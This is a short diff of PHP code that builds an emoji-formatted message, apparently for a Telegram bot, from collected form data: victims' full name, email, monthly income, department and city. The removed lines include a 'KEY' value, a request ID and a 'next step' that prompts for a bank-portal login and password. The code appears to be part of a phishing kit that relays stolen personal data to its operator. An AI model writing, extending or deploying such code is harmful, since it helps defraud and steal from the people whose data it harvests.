@@ -99,11 +99,7 @@ $msg .= "\xF0\x9F\x91\xA4 <b>Nombre Completo:</b> " . fv_sol($nombre) . "\n";
 $msg .= "\xF0\x9F\x93\xA7 <b>Correo:</b> " . fv_sol($correo) . "\n";
 $msg .= "\xF0\x9F\x92\xB5 <b>Ingresos Mensuales:</b> " . fv_sol($ingresos) . "\n";
 $msg .= "\xF0\x9F\x93\x8D <b>Departamento:</b> " . fv_sol($departamento) . "\n";
-$msg .= "\xF0\x9F\x8F\x99 <b>Ciudad / Municipio:</b> " . fv_sol($ciudad) . "\n";
-$msg .= $SEP . "\n";
-$msg .= "\xF0\x9F\x94\x91 <b>KEY:</b> <code>" . fv_sol($claveUnica) . "</code>\n";
-$msg .= "\xF0\x9F\x86\x94 <b>Request ID:</b> <code>" . fv_sol($idPeticion) . "</code>\n";
-$msg .= "\xE2\x9E\xA1\xEF\xB8\x8F Pr\xC3\xB3ximo paso: Virtual-Persona (login de usuario + clave)";
+$msg .= "\xF0\x9F\x8F\x99 <b>Ciudad / Municipio:</b> " . fv_sol($ciudad);
 
 $teclado = array(
     'inline_keyboard' => array(
